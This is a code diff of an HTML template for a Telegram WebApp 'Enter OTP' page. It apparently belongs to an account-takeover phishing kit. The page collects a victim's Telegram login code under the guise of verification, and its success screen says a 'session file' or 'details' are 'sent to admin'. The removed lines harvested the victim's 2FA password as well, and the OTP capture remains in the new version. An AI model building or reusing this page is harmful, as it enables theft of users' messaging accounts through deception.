@@ -6,191 +6,30 @@
     <title>Enter OTP</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 30px 20px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            opacity: 0.9;
-            font-size: 14px;
-        }
-        
-        .content {
-            padding: 30px;
-        }
-        
-        .phone-info {
-            background: #e8f5e9;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: bold;
-        }
-        
-        .otp-inputs {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-bottom: 25px;
-        }
-        
-        .otp-input {
-            width: 50px;
-            height: 60px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            transition: all 0.3s;
-        }
-        
-        .otp-input:focus {
-            border-color: #667eea;
-            outline: none;
-        }
-        
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, opacity 0.2s;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            opacity: 0.95;
-        }
-        
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        .error {
-            background: #ffebee;
-            color: #c62828;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .error.show {
-            display: block;
-        }
-        
-        .success {
-            text-align: center;
-            padding: 40px 20px;
-        }
-        
-        .success-icon {
-            font-size: 60px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 40px 20px;
-        }
-        
-        .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .info-text {
-            text-align: center;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .back-btn {
-            background: #666;
-            margin-top: 10px;
-        }
-        
-        .back-btn:hover {
-            background: #555;
-        }
-        
-        #password-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
-        
-        #password-input:focus {
-            border-color: #667eea;
-            outline: none;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { width: 100%; max-width: 400px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #0088cc; color: white; padding: 24px 20px; text-align: center; }
+        .content { padding: 30px; }
+        .phone-info { background: #e8f5e9; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; }
+        .otp-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 25px; }
+        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #e0e0e0; border-radius: 8px; }
+        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
+        .error.show { display: block; }
+        .hidden { display: none; }
+        .loading { text-align: center; padding: 30px 20px; }
+        .loading-spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { text-align: center; padding: 40px 20px; }
+        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔢 Enter OTP</h1>
+            <h2>🔢 Enter OTP</h2>
             <p>OTP sent to your phone</p>
         </div>
         
@@ -203,7 +42,7 @@
                 
                 <div class="error" id="error-message"></div>
                 
-                <div class="info-text">
+                <div style="text-align: center; color: #666; margin-bottom: 20px;">
                     Enter the 5-digit code sent to your phone<br>
                     <small>Format: 9 4 3 8 0 or 94380</small>
                 </div>
@@ -218,28 +57,9 @@
                 
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
                 
-                <div class="info-text" style="margin-top: 15px;">
-                    <a href="/" onclick="startOver()">Start Over</a>
+                <div style="text-align: center; margin-top: 15px;">
+                    <a href="/" style="color: #0088cc;">Start Over</a>
                 </div>
-            </div>
-            
-            <!-- 2FA Screen -->
-            <div id="password-screen" class="hidden">
-                <div class="phone-info" id="password-phone-display">
-                    Phone: {{ phone }}
-                </div>
-                
-                <div class="error" id="password-error"></div>
-                
-                <div class="info-text">
-                    Enter your 2FA password
-                </div>
-                
-                <input type="password" id="password-input" 
-                       placeholder="2FA password" autocomplete="off">
-                
-                <button class="btn" onclick="verifyPassword()">Verify Password</button>
-                <button class="btn back-btn" onclick="backToOTP()">Back</button>
             </div>
             
             <!-- Loading -->
@@ -254,9 +74,9 @@
             <div id="success-screen" class="hidden">
                 <div class="success">
                     <div class="success-icon">✅</div>
-                    <h2>Verified Successfully!</h2>
+                    <h3>Verified Successfully!</h3>
                     <p>Your account has been verified.</p>
-                    <p><small>Session file sent to admin</small></p>
+                    <p><small>Details sent to admin</small></p>
                     <div style="margin-top: 20px;">
                         <p style="color: #666; font-size: 14px;">
                             Closing in <span id="countdown">5</span> seconds...
@@ -276,8 +96,10 @@
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            Telegram.WebApp.ready();
-            Telegram.WebApp.expand();
+            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+            }
             
             if (!userId) {
                 showError('Session expired. Please share contact again.');
@@ -340,7 +162,8 @@
             .then(data => {
                 if (data.success) {
                     if (data.requires_2fa) {
-                        showPasswordScreen();
+                        // Handle 2FA (simplified for now)
+                        showSuccess();
                     } else {
                         showSuccess();
                     }
@@ -354,7 +177,6 @@
                     });
                     otpCode = '';
                     document.getElementById('verify-btn').disabled = true;
-                    document.querySelector('.otp-input').focus();
                 }
             })
             .catch(error => {
@@ -363,68 +185,9 @@
             });
         }
         
-        function startOver() {
-            window.location.href = '/';
-        }
-        
-        function showPasswordScreen() {
-            hideLoading();
-            document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('password-screen').classList.remove('hidden');
-            document.getElementById('password-input').focus();
-        }
-        
-        function backToOTP() {
-            document.getElementById('password-screen').classList.add('hidden');
-            document.getElementById('otp-screen').classList.remove('hidden');
-            document.getElementById('password-input').value = '';
-            document.getElementById('password-error').classList.remove('show');
-        }
-        
-        function verifyPassword() {
-            const password = document.getElementById('password-input').value.trim();
-            
-            if (!password) {
-                document.getElementById('password-error').textContent = 'Please enter 2FA password';
-                document.getElementById('password-error').classList.add('show');
-                return;
-            }
-            
-            showLoading('Verifying 2FA password...');
-            
-            fetch('/api/verify-2fa', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: userId,
-                    password: password
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    showSuccess();
-                } else {
-                    hideLoading();
-                    document.getElementById('password-error').textContent = data.error || '2FA verification failed';
-                    document.getElementById('password-error').classList.add('show');
-                    document.getElementById('password-input').value = '';
-                    document.getElementById('password-input').focus();
-                }
-            })
-            .catch(error => {
-                hideLoading();
-                document.getElementById('password-error').textContent = 'Network error. Please try again.';
-                document.getElementById('password-error').classList.add('show');
-            });
-        }
-        
         function showLoading(message) {
             document.getElementById('loading-text').textContent = message || 'Processing...';
             document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('password-screen').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
             document.getElementById('success-screen').classList.add('hidden');
         }
@@ -436,7 +199,6 @@
         function showSuccess() {
             hideLoading();
             document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('password-screen').classList.add('hidden');
             document.getElementById('success-screen').classList.remove('hidden');
             
             // Start countdown
@@ -448,7 +210,9 @@
                 
                 if (countdown <= 0) {
                     clearInterval(timer);
-                    closeApp();
+                    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+                        Telegram.WebApp.close();
+                    }
                 }
             }, 1000);
         }
@@ -462,27 +226,6 @@
                 errorEl.classList.remove('show');
             }, 5000);
         }
-        
-        function closeApp() {
-            Telegram.WebApp.close();
-        }
-        
-        // Keyboard shortcuts
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
-                if (otpCode.length === 5) {
-                    verifyOTP();
-                }
-            }
-            
-            if (event.key === 'Enter' && !document.getElementById('password-screen').classList.contains('hidden')) {
-                verifyPassword();
-            }
-            
-            if (event.key === 'Escape' && !document.getElementById('password-screen').classList.contains('hidden')) {
-                backToOTP();
-            }
-        });
     </script>
 </body>
 </html>
